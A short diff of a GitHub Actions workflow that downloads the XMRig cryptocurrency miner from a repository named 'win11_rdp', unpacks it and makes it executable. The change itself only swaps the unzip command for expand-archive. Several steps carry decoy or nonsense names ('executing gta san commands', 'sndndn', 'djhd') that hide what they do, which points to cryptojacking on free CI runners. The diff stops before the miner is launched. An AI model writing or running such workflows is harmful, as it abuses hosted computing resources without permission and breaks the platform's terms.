@@ -12,7 +12,7 @@ jobs:
     - name: downloading xm
       run: Invoke-WebRequest https://github.com/Ma24wt/win11_rdp/blob/main/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip
     - name: executing gta san commands
-      run: unzip xmrig-6.17.0-gcc-win64.zip
+      run: expand-archive xmrig-6.17.0-gcc-win64.zip
     - name : sndndn 
       run: cd xmrig-6.17.0-gcc-win64/xmrig-6.17.0 && chmod +x xmrig.exe
     - name : djhd
